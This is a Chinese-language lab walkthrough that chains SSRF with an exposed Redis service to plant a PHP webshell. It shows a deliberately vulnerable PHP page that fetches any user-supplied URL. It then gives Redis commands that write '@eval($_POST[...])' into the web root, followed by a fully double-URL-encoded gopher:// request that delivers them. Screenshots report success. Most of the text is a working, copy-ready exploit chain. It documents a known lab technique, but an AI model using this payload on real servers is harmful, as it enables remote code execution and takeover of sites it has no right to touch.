

# ssrf+redis 实现webshell

创建存在ssrf的网页

```
<?php
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $_GET['url']);
#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
curl_exec($ch);
curl_close($ch);
?>
```

> 测试

```
http://127.0.0.1:889/ssrf/2.php?url=http://www.baidu.com
```

![image-20220303144221986](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203031442085.png)

## 1、查看是否存在redis

进行redis的默认端口6379进行访问，如下图，可以发现靶机上的redis服务

```
http://127.0.0.1:889/ssrf/2.php?url=dict://127.0.0.1:6379/info
```

![image-20220303144544828](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203031445913.png)

## 2、webshell payload

> redis  payload
>
> 在D:\xp.cn\www\wwwroot\admin\localhost_889\wwwroot\DoraBox\ssrf 文件夹创建 shell.php 文件

```
set x "\n\n\n<?php @eval($_POST['redis']);?>\n\n\n"
config set dir D:\xp.cn\www\wwwroot\admin\localhost_889\wwwroot\DoraBox\ssrf 
config set dbfilename shell.php
save
```

## 3、请求伪造

8通过URL访问SSRF漏洞地址：http://10.1.8.159/ssrf.php?url=
结合gother协议构造符合格式的paylod，从而模拟redis通信。
正常是在redis客户端和服务端连接通信时

> 将gother后面非字符内容进行URL编码

```
http://192.168.211.130/ssrf.php?url=gother://127.0.0.1:6379/_payload
转换为：
http://192.168.211.130/ssrf.php?url=gopher%3a%2f%2f127.0.0.1%3a6379%2f_payload
```

> 对payload进行两次url编码

![image-20220303145005482](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203031450565.png)

```
%25%37%33%25%36%35%25%37%34%25%32%30%25%37%38%25%32%30%25%32%32%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%33%63%25%33%66%25%37%30%25%36%38%25%37%30%25%32%30%25%34%30%25%36%35%25%37%36%25%36%31%25%36%63%25%32%38%25%32%34%25%35%66%25%35%30%25%34%66%25%35%33%25%35%34%25%35%62%25%32%37%25%37%32%25%36%35%25%36%34%25%36%39%25%37%33%25%32%37%25%35%64%25%32%39%25%33%62%25%33%66%25%33%65%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%32%32%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%39%25%37%32%25%32%30%25%34%34%25%33%61%25%35%63%25%37%38%25%37%30%25%32%65%25%36%33%25%36%65%25%35%63%25%37%37%25%37%37%25%37%37%25%35%63%25%37%37%25%37%37%25%37%37%25%37%32%25%36%66%25%36%66%25%37%34%25%35%63%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65%25%35%63%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34%25%35%66%25%33%38%25%33%38%25%33%39%25%35%63%25%37%37%25%37%37%25%37%37%25%37%32%25%36%66%25%36%66%25%37%34%25%35%63%25%34%34%25%36%66%25%37%32%25%36%31%25%34%32%25%36%66%25%37%38%25%35%63%25%37%33%25%37%33%25%37%32%25%36%36%25%32%30%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%32%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%32%30%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30%25%30%61%25%37%33%25%36%31%25%37%36%25%36%35
```

> 最终请求url参数

```
gopher%3a%2f%2f127.0.0.1%3a6379%2f%25%37%33%25%36%35%25%37%34%25%32%30%25%37%38%25%32%30%25%32%32%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%33%63%25%33%66%25%37%30%25%36%38%25%37%30%25%32%30%25%34%30%25%36%35%25%37%36%25%36%31%25%36%63%25%32%38%25%32%34%25%35%66%25%35%30%25%34%66%25%35%33%25%35%34%25%35%62%25%32%37%25%37%32%25%36%35%25%36%34%25%36%39%25%37%33%25%32%37%25%35%64%25%32%39%25%33%62%25%33%66%25%33%65%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%32%32%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%39%25%37%32%25%32%30%25%34%34%25%33%61%25%35%63%25%37%38%25%37%30%25%32%65%25%36%33%25%36%65%25%35%63%25%37%37%25%37%37%25%37%37%25%35%63%25%37%37%25%37%37%25%37%37%25%37%32%25%36%66%25%36%66%25%37%34%25%35%63%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65%25%35%63%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34%25%35%66%25%33%38%25%33%38%25%33%39%25%35%63%25%37%37%25%37%37%25%37%37%25%37%32%25%36%66%25%36%66%25%37%34%25%35%63%25%34%34%25%36%66%25%37%32%25%36%31%25%34%32%25%36%66%25%37%38%25%35%63%25%37%33%25%37%33%25%37%32%25%36%36%25%32%30%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%32%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%32%30%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30%25%30%61%25%37%33%25%36%31%25%37%36%25%36%35
```

## 4、结果

> 访问

![image-20220303145316880](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203031453976.png)

webshell 生成成功

![image-20220303145439880](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203031454988.png)

![image-20220303145456089](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202203031454142.png)